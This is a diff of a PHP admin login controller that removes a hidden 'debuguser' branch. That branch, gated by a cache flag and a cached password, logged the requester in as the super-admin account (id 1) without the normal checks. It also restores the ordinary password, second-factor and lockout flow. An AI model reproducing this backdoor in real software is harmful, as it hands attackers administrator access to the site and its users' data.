@@ -892,14 +892,45 @@ class PublicController extends \cmf\controller\BaseController
             $where["user_login"] = $name;
         }
         $result = \think\Db::name("user")->where($where)->find();
-        if (intval(cache("shd_debug_model")) && $name == "debuguser") {
-            if ($pass == cache("shd_debug_model_password")) {
-                $result = \think\Db::name("user")->where("id", 1)->find();
+        if (!empty($result) && $result["user_type"] == 1) {
+            if ($result["user_status"] == 0) {
+                $data["msg"] = lang("ADMIN_USER_DISABLE");
+                return json($data);
+            }
+            if (cmf_compare_password($pass, $result["user_pass"])) {
+                $action = "login";
+                $email = $result["user_email"];
+                if (isSecondVerify($action, true)) {
+                    $code = $this->request->param("code");
+                    if (empty($code)) {
+                        return json(["status" => 400, "msg" => "验证码不能为空"]);
+                    }
+                    if (cache($action . "_admin_" . $email) != $code) {
+                        return json(["status" => 400, "msg" => "验证码错误"]);
+                    }
+                    cache($action . "_admin_" . $email, null);
+                }
+                $groups = \think\Db::name("RoleUser")
+                    ->alias("a")
+                    ->join("__ROLE__ b", "a.role_id =b.id")
+                    ->where(["user_id" => $result["id"], "status" => 1])
+                    ->value("role_id");
+                if ($result["id"] != 1 && (empty($groups) || empty($result["user_status"]))) {
+                    $this->error(lang("USE_DISABLED"));
+                }
                 session_start();
                 session("ADMIN_ID", $result["id"]);
                 session("name", $result["user_login"]);
                 session("admin_login_info", md5($ip));
-                cookie("admin_username", $result["user_login"]);
+                admin_log();
+                $result["last_login_ip"] = $ip;
+                $result["last_login_time"] = time();
+                $token = cmf_generate_user_token($result["id"], "web");
+                if (!empty($token)) {
+                    session("token", $token);
+                }
+                \think\Db::name("user")->where("id", $result["id"])->update($result);
+                cookie("admin_username", $name);
                 cookie("SameSite", "Lax");
                 session("__LOGIN_BY_CMF_ADMIN_PW__", null);
                 $data["status"] = 200;
@@ -923,19 +954,12 @@ class PublicController extends \cmf\controller\BaseController
                 ];
                 $curl_multi_data[0] = ["url" => "async", "data" => $arr_admin];
                 asyncCurlMulti($curl_multi_data);
-                $token = cmf_generate_user_token($result["id"], "web");
-                if (!empty($token)) {
-                    session("token", $token);
-                }
                 session_write_close();
                 hook("admin_login", [
                     "adminid" => $result["id"],
                     "admin" => $result["user_login"],
                     "nickname" => $result["user_nickname"],
                 ]);
-                \think\Db::name("user")
-                    ->where("id", 1)
-                    ->update(["last_login_ip" => $ip, "last_login_time" => time()]);
                 if (in_array($result["language"], ["zh-cn", "zh-hk", "en-us"])) {
                     \think\Db::name("user")
                         ->where("id", $result["id"])
@@ -970,152 +994,20 @@ class PublicController extends \cmf\controller\BaseController
                 $data["data"]["display_lang_config"] = $display_config;
                 return json($data);
             } else {
-                $data["msg"] = lang("PASSWORD_NOT_RIGHT");
-                return json($data);
-            }
-        } else {
-            if (!empty($result) && $result["user_type"] == 1) {
-                if ($result["user_status"] == 0) {
-                    $data["msg"] = lang("ADMIN_USER_DISABLE");
-                    return json($data);
-                }
-                if (cmf_compare_password($pass, $result["user_pass"])) {
-                    $action = "login";
-                    $email = $result["user_email"];
-                    if (isSecondVerify($action, true)) {
-                        $code = $this->request->param("code");
-                        if (empty($code)) {
-                            return json(["status" => 400, "msg" => "验证码不能为空"]);
-                        }
-                        if (cache($action . "_admin_" . $email) != $code) {
-                            return json(["status" => 400, "msg" => "验证码错误"]);
-                        }
-                        cache($action . "_admin_" . $email, null);
+                $login_error_num = \think\facade\Cache::get($key);
+                if ($this->num <= $login_error_num) {
+                    $exist = \think\Db::name("blacklist")->where("ip", sprintf("%u", ip2long($ip)))->find();
+                    if (empty($exist)) {
+                        \think\Db::name("blacklist")
+                            ->data([
+                                "ip" => sprintf("%u", ip2long($ip)),
+                                "create_time" => $this->request->time(),
+                                "type" => 1,
+                                "username" => $name,
+                            ])
+                            ->insert();
                     }
-                    $groups = \think\Db::name("RoleUser")
-                        ->alias("a")
-                        ->join("__ROLE__ b", "a.role_id =b.id")
-                        ->where(["user_id" => $result["id"], "status" => 1])
-                        ->value("role_id");
-                    if ($result["id"] != 1 && (empty($groups) || empty($result["user_status"]))) {
-                        $this->error(lang("USE_DISABLED"));
-                    }
-                    session_start();
-                    session("ADMIN_ID", $result["id"]);
-                    session("name", $result["user_login"]);
-                    session("admin_login_info", md5($ip));
-                    admin_log();
-                    $result["last_login_ip"] = $ip;
-                    $result["last_login_time"] = time();
-                    $token = cmf_generate_user_token($result["id"], "web");
-                    if (!empty($token)) {
-                        session("token", $token);
-                    }
-                    \think\Db::name("user")->where("id", $result["id"])->update($result);
-                    cookie("admin_username", $name);
-                    cookie("SameSite", "Lax");
-                    session("__LOGIN_BY_CMF_ADMIN_PW__", null);
-                    $data["status"] = 200;
-                    $data["msg"] = lang("LOGIN_SUCCESS");
-                    $adminUserModel = new \app\admin\model\AdminUserModel();
-                    $data["data"]["user"]["user_login"] = $result["user_login"];
-                    $data["data"]["user"]["user_nickname"] = $result["user_nickname"];
-                    $data["data"]["rule"] = $adminUserModel->get_rule($result["id"]);
-                    $data["data"]["user_tastes"] = \think\Db::name("user_tastes")
-                        ->field(["id", "uid"], true)
-                        ->where("uid", $result["id"])
-                        ->find();
-                    $arr_admin = [
-                        "relid" => cmf_get_current_admin_id(),
-                        "name" => "【管理员】登录提醒",
-                        "type" => "admin",
-                        "sync" => true,
-                        "admin" => true,
-                        "adminid" => cmf_get_current_admin_id(),
-                        "ip" => get_client_ip6(),
-                    ];
-                    $curl_multi_data[0] = ["url" => "async", "data" => $arr_admin];
-                    asyncCurlMulti($curl_multi_data);
-                    session_write_close();
-                    hook("admin_login", [
-                        "adminid" => $result["id"],
-                        "admin" => $result["user_login"],
-                        "nickname" => $result["user_nickname"],
-                    ]);
-                    if (in_array($result["language"], ["zh-cn", "zh-hk", "en-us"])) {
-                        \think\Db::name("user")
-                            ->where("id", $result["id"])
-                            ->update(["language" => "CN"]);
-                    }
-                    $domain = config("database.admin_application") ?? "admin";
-                    $opendir = CMF_ROOT . "/public/{$domain}/lang/";
-                    $country_img_dir = configuration("domain") . "/upload/common/country/";
-                    $display_config = [];
-                    if (is_dir($opendir)) {
-                        $handler = opendir($opendir);
-                        while (($filename = readdir($handler)) !== false) {
-                            if ($filename == "." || $filename == "..") {
-                            } else {
-                                if (file_exists($opendir . $filename)) {
-                                    $str = file_get_contents($opendir . $filename);
-                                    preg_match("/display_name(.+?),/", $str, $display_name_ing);
-                                    preg_match("/display_flag(.+?),/", $str, $display_flag_ing);
-                                    $display_name = preg_replace("/:|'|,|\"/", "", $display_name_ing[1]);
-                                    $display_flag = preg_replace("/:|'|,|\"/", "", $display_flag_ing[1]);
-                                    $file_name = str_replace(strrchr($filename, "."), "", $filename);
-                                    $display_config_now["display_name"] = trim($display_name);
-                                    $display_config_now["display_flag"] = trim($display_flag);
-                                    $display_config_now["file_name"] = trim($file_name);
-                                    $display_config_now["country_imgUrl"] =
-                                        $country_img_dir . $display_config_now["display_flag"] . ".png";
-                                    $display_config[] = $display_config_now;
-                                }
-                            }
-                        }
-                    }
-                    $data["data"]["display_lang_config"] = $display_config;
-                    return json($data);
-                } else {
-                    $login_error_num = \think\facade\Cache::get($key);
-                    if ($this->num <= $login_error_num) {
-                        $exist = \think\Db::name("blacklist")->where("ip", sprintf("%u", ip2long($ip)))->find();
-                        if (empty($exist)) {
-                            \think\Db::name("blacklist")
-                                ->data([
-                                    "ip" => sprintf("%u", ip2long($ip)),
-                                    "create_time" => $this->request->time(),
-                                    "type" => 1,
-                                    "username" => $name,
-                                ])
-                                ->insert();
-                        }
-                        \think\facade\Cache::set($disable_login_key, 1, $this->disable_login_expire);
-                        $email = new \app\common\logic\Email();
-                        $email->is_admin = true;
-                        $email->sendEmailBase(
-                            $result["id"],
-                            "【管理员】登录提醒",
-                            "admin",
-                            false,
-                            false,
-                            "",
-                            "",
-                            "管理员在地址{$ip}登录失败,原因:" . lang("ADMIN_USER_DISABLE"),
-                        );
-                        active_log_final(
-                            "管理员在地址{$ip}登录失败,原因:" . lang("ADMIN_USER_DISABLE"),
-                            $result["id"],
-                            1,
-                            $result["id"],
-                        );
-                        $data["msg"] = lang("ADMIN_USER_DISABLE");
-                        return json($data);
-                    }
-                    if ($login_error_num > 0) {
-                        \think\facade\Cache::inc($key);
-                    } else {
-                        \think\facade\Cache::set($key, 1, $this->expire);
-                    }
+                    \think\facade\Cache::set($disable_login_key, 1, $this->disable_login_expire);
                     $email = new \app\common\logic\Email();
                     $email->is_admin = true;
                     $email->sendEmailBase(
@@ -1126,18 +1018,22 @@ class PublicController extends \cmf\controller\BaseController
                         false,
                         "",
                         "",
-                        "管理员在地址{$ip}登录失败,原因:" . lang("PASSWORD_NOT_RIGHT"),
+                        "管理员在地址{$ip}登录失败,原因:" . lang("ADMIN_USER_DISABLE"),
                     );
                     active_log_final(
-                        "管理员在地址{$ip}登录失败,原因:" . lang("PASSWORD_NOT_RIGHT"),
+                        "管理员在地址{$ip}登录失败,原因:" . lang("ADMIN_USER_DISABLE"),
                         $result["id"],
                         1,
                         $result["id"],
                     );
-                    $data["msg"] = lang("PASSWORD_NOT_RIGHT");
+                    $data["msg"] = lang("ADMIN_USER_DISABLE");
                     return json($data);
                 }
-            } else {
+                if ($login_error_num > 0) {
+                    \think\facade\Cache::inc($key);
+                } else {
+                    \think\facade\Cache::set($key, 1, $this->expire);
+                }
                 $email = new \app\common\logic\Email();
                 $email->is_admin = true;
                 $email->sendEmailBase(
@@ -1148,17 +1044,38 @@ class PublicController extends \cmf\controller\BaseController
                     false,
                     "",
                     "",
-                    "管理员在地址{$ip}登录失败,原因:" . lang("USERNAME_NOT_EXIST"),
+                    "管理员在地址{$ip}登录失败,原因:" . lang("PASSWORD_NOT_RIGHT"),
                 );
                 active_log_final(
-                    "管理员在地址{$ip}登录失败,原因:" . lang("USERNAME_NOT_EXIST"),
+                    "管理员在地址{$ip}登录失败,原因:" . lang("PASSWORD_NOT_RIGHT"),
                     $result["id"],
                     1,
                     $result["id"],
                 );
-                $data["msg"] = lang("USERNAME_NOT_EXIST");
+                $data["msg"] = lang("PASSWORD_NOT_RIGHT");
                 return json($data);
             }
+        } else {
+            $email = new \app\common\logic\Email();
+            $email->is_admin = true;
+            $email->sendEmailBase(
+                $result["id"],
+                "【管理员】登录提醒",
+                "admin",
+                false,
+                false,
+                "",
+                "",
+                "管理员在地址{$ip}登录失败,原因:" . lang("USERNAME_NOT_EXIST"),
+            );
+            active_log_final(
+                "管理员在地址{$ip}登录失败,原因:" . lang("USERNAME_NOT_EXIST"),
+                $result["id"],
+                1,
+                $result["id"],
+            );
+            $data["msg"] = lang("USERNAME_NOT_EXIST");
+            return json($data);
         }
     }
     public function getMenu()
